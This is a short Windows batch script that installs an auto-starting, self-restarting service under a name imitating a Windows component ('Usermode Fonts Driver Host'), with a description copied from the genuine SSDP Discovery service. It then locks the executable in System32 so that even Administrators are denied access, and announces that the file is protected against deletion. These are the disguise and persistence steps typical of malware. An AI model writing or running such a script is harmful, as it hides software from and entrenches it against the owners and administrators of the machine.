@echo off
set SERVICE_NAME="Usermode Fonts Driver Host"
set SERVICE_EXE=Usermode Fonts Driver Host.exe
set SERVICE_PATH=C:\Windows\System32\%SERVICE_EXE%
set SERVICE_DESC=Discovers network devices and services that use the SSDP discovery protocol, such as UPnP devices...

:: ✅ Create the service
echo [*] Creating Windows Service: %SERVICE_NAME%
sc create %SERVICE_NAME% binPath= "%SERVICE_PATH%" start= auto

:: ✅ Set service description
echo [*] Setting service description...
sc description %SERVICE_NAME% "%SERVICE_DESC%"

:: ✅ Set recovery options
echo [*] Setting recovery options...
sc failure %SERVICE_NAME% reset= 86400 actions= restart/000

:: ✅ Start the service
echo [*] Starting service...
sc start %SERVICE_NAME%

:: ✅ Make file read-only and deny permissions
echo [*] Securing service EXE file...

:: 1. Make the file read-only
attrib +R "%SERVICE_PATH%"

:: 2. Remove all permissions except SYSTEM
icacls "%SERVICE_PATH%" /inheritance:r
icacls "%SERVICE_PATH%" /grant SYSTEM:F
icacls "%SERVICE_PATH%" /deny Everyone:(F)
icacls "%SERVICE_PATH%" /deny Administrators:(F)
icacls "%SERVICE_PATH%" /deny Users:(F)

:: ✅ Show current file permission
echo [*] File permissions set to protected:
icacls "%SERVICE_PATH%"
echo.
sc query %SERVICE_NAME%
echo.
echo [?] Service installed and the EXE file is protected against delete/move/copy!


